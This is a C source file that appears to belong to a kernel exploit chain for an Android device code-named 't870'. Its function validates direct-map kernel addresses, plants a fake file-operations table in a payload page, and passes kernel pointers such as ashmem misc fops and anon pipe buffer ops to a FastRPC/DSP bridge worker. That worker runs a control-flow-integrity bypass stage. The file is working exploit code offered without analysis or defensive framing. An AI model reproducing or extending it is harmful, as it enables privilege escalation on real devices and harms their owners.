#include "common.h"
#include "t870_payload_bridge.h"

#include "t870_bridge.h"
#include "t870_detached_owner.h"
#include "t870_dsp_asset.h"
#include "t870_fastrpc_bridge_adapter.h"

#include <errno.h>
#include <limits.h>
#include <stdint.h>
#include <stdio.h>

#define T870_BRIDGE_TIMEOUT_MS 90000U

static int run_original_route(void *opaque)
{
    (void)opaque;
    return try_cfi_stage();
}

static void publish_nonretryable(void *opaque)
{
    (void)opaque;
    app_publish_p0_dirty();
}

int t870_run_payload_bridge(void)
{
    struct t870_fastrpc_bridge_adapter adapter = {0};
    uintptr_t misc_fops_direct = data_addr(ASHMEM_MISC_FOPS);
    uintptr_t payload_base = page_base + SKB_DATA_DELTA;
    char dsp_directory[PATH_MAX] = {0};
    pid_t owner_pid = -1;
    int result;

    if (!is_direct_ptr(page_base) || !is_direct_ptr(payload_base) ||
        !is_direct_ptr(misc_fops_direct) ||
        fake_fops != payload_base + FOPS_TABLE_OFF) {
        pr_error("t870 bridge original runtime contract failed "
                 "page=%016zx payload=%016zx fake_fops=%016zx "
                 "misc=%016zx\n",
                 page_base, payload_base, fake_fops, misc_fops_direct);
        return EINVAL;
    }
    if (t870_prepare_dsp_asset(dsp_directory,
                               sizeof(dsp_directory)) != 0) {
        pr_error("t870 embedded DSP preparation failed errno=%d\n", errno);
        return errno != 0 ? errno : EIO;
    }

    adapter.dsp_library_directory = dsp_directory;
    adapter.inputs.payload_base = page_base;
    adapter.inputs.fake_fops = fake_fops;
    adapter.inputs.misc_fops_direct = misc_fops_direct;
    adapter.inputs.misc_fops_page = direct_to_page(misc_fops_direct);
    adapter.inputs.anon_pipe_buf_ops = text_addr(ANON_PIPE_BUF_OPS);
    adapter.verify_original_route = run_original_route;
    adapter.mark_nonretryable = publish_nonretryable;

    pr_info("t870 FastRPC bridge spawn page=%016zx fake_fops=%016zx "
            "misc=%016zx page_struct=%016llx pipe_ops=%016llx\n",
            page_base, fake_fops, misc_fops_direct,
            (unsigned long long)adapter.inputs.misc_fops_page,
            (unsigned long long)adapter.inputs.anon_pipe_buf_ops);
    result = t870_spawn_detached_owner(
        t870_fastrpc_bridge_adapter_worker, &adapter,
        T870_BRIDGE_TIMEOUT_MS, &owner_pid);
    if (result == 0) {
        pr_success("t870 FastRPC bridge owner=%d original route verified\n",
                   owner_pid);
        return 0;
    }
    if (result == T870_OWNER_DIRTY_FAILURE) {
        pr_error("t870 FastRPC bridge dirty failure owner=%d; reboot before "
                 "retry\n", owner_pid);
        app_publish_p0_dirty();
        return result;
    }
    pr_error("t870 FastRPC bridge clean failure result=%d errno=%d\n",
             result, errno);
    return result != 0 ? result : EIO;
}
